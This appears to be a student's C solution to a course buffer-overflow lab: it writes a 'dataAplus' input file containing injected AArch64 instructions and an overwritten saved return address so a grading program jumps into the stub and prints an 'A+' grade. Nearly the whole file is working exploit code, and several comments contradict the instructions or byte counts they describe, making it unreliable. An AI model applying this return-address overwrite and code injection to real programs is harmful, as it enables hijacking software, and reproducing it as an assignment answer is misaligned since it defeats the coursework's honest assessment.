/* createdataAplus.c
 *
 * Generates the “dataAplus” payload for the grader.
 * BüFSIZE=48 bytes for the injected stub in name[], followed by your message.
 */

#include <stdio.h>
#include "miniassembler.h"
#include <string.h>

int main(void)
{
    FILE *f;
    unsigned long pc;
    unsigned int instr;
    int i;

    /* These constants come from the grader’s map: */
    const unsigned long NAME_ADDR = 0x420058UL;  /* start of name[] in BSS */
    const unsigned long GRADE_ADDR = 0x420044UL; /* &grade global ('D') */
    const unsigned long PRINT_ADDR = 0x40089cUL;
    unsigned long returnAddr = 0x420058UL + 8; /* skip-B, print-grade code */

    const unsigned long PRINTF_ADDR = 0x400690; /* Start of printf */

    /* 1) Open the attack file for binary write */
    f = fopen("dataAplus", "w");
    fprintf(f, "%s", "OB");

    for (i = 0; i < 2; i++)
    {
        fprintf(f, "%c", '\0');
    }

    fprintf(f, "%c", '%');
    fprintf(f, "%c", 'c');

    /* e) Pad stub out to 48 bytes with null bytes" */
    for (i = 0; i < 2; i++)
    {
        fprintf(f, "%c", '\0');
    }

    /* 2) Emit a 48-byte stub into buf[] (and ultimately name[]): */
    pc = NAME_ADDR + 8; /* at runtime, the stub’s first instr is at NAME_ADDR */

    /* a) ADR  X0, GRADE_ADDR(PC)   ; X0 ← &grade       */
    instr = MiniAssembler_adr(0, GRADE_ADDR, pc);
    fwrite(&instr, 4, 1, f);
    pc += 4;

    /* b) MOV  W1, #'A'             ; W1 ← ASCII '\0'   */
    instr = MiniAssembler_mov(1, (int)'\0');
    fwrite(&instr, 4, 1, f);
    pc += 4;

    /* c) STRB W1, [X0]             ; *(&grade) = '\0'  */
    instr = MiniAssembler_strb(1, 0);
    fwrite(&instr, 4, 1, f);
    pc += 4;

    instr = MiniAssembler_ldr(0, NAME_ADDR + 4, pc);
    fwrite(&instr, 4, 1, f);
    pc += 4;

    /* b) MOV  w1, 'A'             ; W1 ← ASCII 'A'   */
    instr = MiniAssembler_mov(1, (int)'A');
    fwrite(&instr, 4, 1, f);
    pc += 4;

    instr = MiniAssembler_bl(PRINTF_ADDR, pc);
    fwrite(&instr, 4, 1, f);
    pc += 4;

    /* b) MOV  W1, #'+'             ; W1 ← ASCII '+'   */
    instr = MiniAssembler_mov(1, (int)'+');
    fwrite(&instr, 4, 1, f);
    pc += 4;

    instr = MiniAssembler_bl(PRINTF_ADDR, pc);
    fwrite(&instr, 4, 1, f);
    pc += 4;

    /* d) B    PRINT_ADDR(PC)       ; jump into grader’s printf */
    instr = MiniAssembler_b(PRINT_ADDR, pc);
    fwrite(&instr, 4, 1, f);
    pc += 4;

    for (i = 0; i < 4; i++)
    {
        fprintf(f, "%c", '\0');
    }

    /* 3) Overwrite readString’s saved x30 with NAME_ADDR
        so that when readString does `ret`, it jumps into our stub. */
    fwrite(&returnAddr, sizeof(PRINT_ADDR), 1, f);

    fclose(f);
    return 0;
}